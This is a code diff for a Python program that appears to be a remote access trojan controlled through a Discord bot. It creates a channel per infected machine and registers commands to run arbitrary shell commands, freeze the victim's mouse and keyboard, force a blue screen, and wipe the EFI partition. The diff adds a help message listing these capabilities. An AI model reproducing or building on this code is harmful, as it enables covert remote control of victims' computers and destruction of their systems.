@@ -34,7 +34,7 @@ def get_user_uuid():
     return computer_uuid.lower()
 guild_id = '1214641970631417876'
 user = DiscordRestAPI.User()
-user = user.Login(',',True)
+user = user.Login('---',True)
 channel_id = user.Channel.Create(user,guild_id,get_user_uuid(),"1214644732148588555")['id']
 def Mbox(text):
     with open(os.environ['temp'] + '\\message.vbs','w') as f:
@@ -147,7 +147,18 @@ assign letter=Z
         computer_bsod()
     else:
         user.Message.Send(user,"Choose option: (bsod/breakwindows)",channel_id)
-
+def help_cmds():
+    user.Message.Send(user,'''
+!help = this help message lol
+!stop = stop program
+!run_cmd <cmd> = runs command prompt command
+!msg <msg> = send message to computer
+---D A N G E R---
+!danger breakwindows = Wipes EFI Partition
+!danger bsod = bsod computer
+--- NON DANGER ---
+!freeze <yes/no> = freezes mouse and keyboard 
+''',channel_id)
 user.Command.add_command(user,'get_info',channel_id,'!',get_info,1)
 user.Command.add_command(user,'stop',channel_id,'!',exit_script)
 user.Command.add_command(user,'run_cmd',channel_id,'!',run_command,-1)
@@ -156,6 +167,7 @@ user.Command.add_command(user,'msg',channel_id,'!',msgbox,-1)
 user.Command.add_command(user,'danger',channel_id,'!',danger,1)
 user.Command.add_command(user,'freeze',channel_id,'!',freeze_mouse,1)
 #user.Command.add_command(user,'move',channel_id,'!',move_mouse,2)
+user.Command.add_command(user,'help',channel_id,'!',help_cmds,0)
 
 atexit.register(remove_channel,channel_id)
 #time.sleep(3)
